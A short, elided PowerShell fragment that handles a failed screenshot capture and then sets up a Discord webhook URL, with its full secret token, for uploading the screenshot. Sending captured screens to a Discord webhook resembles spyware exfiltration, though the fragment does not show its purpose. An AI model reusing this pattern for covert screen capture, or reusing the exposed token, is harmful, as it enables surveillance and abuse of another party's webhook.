...
try {
    ...
    Write-Error "Failed to create screenshot file: $_"
    exit 1
}

# Upload the screenshot to Discord webhook
$webhookUrl = 'https://discord.com/api/webhooks/1273262656849055856/Ov-nx3qkObIKW6f8Ocf0FBH4bDrERRUDXvPnJwQvl2pZZA-yWQCP8tqa4fOCkSqnP_da'
